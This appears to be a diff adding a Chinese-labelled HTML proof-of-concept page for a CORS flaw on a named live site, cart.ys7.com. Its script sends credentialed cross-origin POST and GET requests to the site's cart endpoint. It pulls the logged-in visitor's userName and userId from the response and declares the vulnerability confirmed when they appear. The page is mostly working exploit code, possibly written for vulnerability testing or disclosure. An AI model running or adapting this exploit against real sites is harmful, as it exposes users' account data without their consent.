@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<title>CORS PoC - cart.ys7.com</title>
+<style>
+  body { font-family: Consolas, monospace; padding: 20px; background: #1e1e1e; color: #d4d4d4; }
+  h1 { color: #4ec9b0; font-size: 18px; }
+  .box { background: #252526; border: 1px solid #3e3e42; padding: 12px; margin: 10px 0; border-radius: 4px; }
+  .ok { color: #4ec9b0; }
+  .err { color: #f48771; }
+  .warn { color: #dcdcaa; }
+  pre { white-space: pre-wrap; word-break: break-all; margin: 6px 0; }
+  .label { color: #569cd6; font-weight: bold; }
+</style>
+</head>
+<body>
+
+<h1>CORS PoC — cart.ys7.com</h1>
+
+<div class="box">
+  <span class="label">当前页面 Origin：</span>
+  <span id="pageOrigin"></span>
+</div>
+
+<div class="box">
+  <span class="label">测试目标：</span> https://cart.ys7.com/cartBrief/queryCartResume
+</div>
+
+<div id="results"></div>
+
+<script>
+const out = document.getElementById('results');
+document.getElementById('pageOrigin').textContent = location.origin;
+
+function log(label, cls, content) {
+  const d = document.createElement('div');
+  d.className = 'box';
+  d.innerHTML = '<span class="label">' + label + '</span><pre class="' + (cls||'') + '">' + content + '</pre>';
+  out.appendChild(d);
+}
+
+// 测试 1：不带 credentials
+async function testNoCreds() {
+  try {
+    const r = await fetch('https://cart.ys7.com/cartBrief/queryCartResume', {
+      method: 'POST',
+      credentials: 'omit',
+      headers: {'Content-Type': 'application/json'},
+      body: '{}'
+    });
+    const t = await r.text();
+    log('测试1：credentials=omit（不带 cookie）', 'warn',
+        'HTTP ' + r.status + '\n' + t.slice(0, 500));
+  } catch (e) {
+    log('测试1：credentials=omit', 'err', 'ERR: ' + e.message);
+  }
+}
+
+// 测试 2：带 credentials（关键！）
+async function testWithCreds() {
+  try {
+    const r = await fetch('https://cart.ys7.com/cartBrief/queryCartResume', {
+      method: 'POST',
+      credentials: 'include',
+      headers: {'Content-Type': 'application/json'},
+      body: '{}'
+    });
+    const t = await r.text();
+    let isVisitor = t.includes('"visitor":true');
+    let isLoggedIn = t.includes('"visitor":false');
+    let userMatch = t.match(/"userName":"([^"]*)"/);
+    let idMatch = t.match(/"userId":"([^"]*)"/);
+
+    let verdict = '';
+    let cls = 'warn';
+    if (isLoggedIn && userMatch && userMatch[1]) {
+      verdict = '\n\n🔴 漏洞成立！读到登录用户数据：';
+      verdict += '\n   userName = ' + userMatch[1];
+      verdict += '\n   userId   = ' + (idMatch ? idMatch[1] : '');
+      cls = 'err';
+    } else if (isVisitor) {
+      verdict = '\n\n⚪ 未带上 cookie（visitor:true）—— CORS 不可利用或 cookie SameSite 阻止';
+      cls = 'ok';
+    }
+
+    log('测试2：credentials=include（带 cookie，关键）', cls,
+        'HTTP ' + r.status + '\n' + t.slice(0, 500) + verdict);
+  } catch (e) {
+    log('测试2：credentials=include', 'err',
+        'ERR: ' + e.message + '\n（CORS 被阻止，或网络失败）');
+  }
+}
+
+// 测试 3：GET 一个只读接口
+async function testGet() {
+  try {
+    const r = await fetch('https://cart.ys7.com/', {
+      method: 'GET',
+      credentials: 'include'
+    });
+    const t = await r.text();
+    log('测试3：GET cart.ys7.com/', 'warn',
+        'HTTP ' + r.status + '\n长度: ' + t.length);
+  } catch (e) {
+    log('测试3：GET /', 'err', 'ERR: ' + e.message);
+  }
+}
+
+(async () => {
+  await testNoCreds();
+  await testWithCreds();
+  await testGet();
+  log('说明', 'ok',
+      '测试2 是核心：如果显示 🔴，CORS 漏洞成立；\n' +
+      '如果显示 ⚪（visitor:true），说明 cookie 没带上（SameSite 阻止），漏洞不成立。');
+})();
+</script>
+
+</body>
+</html>
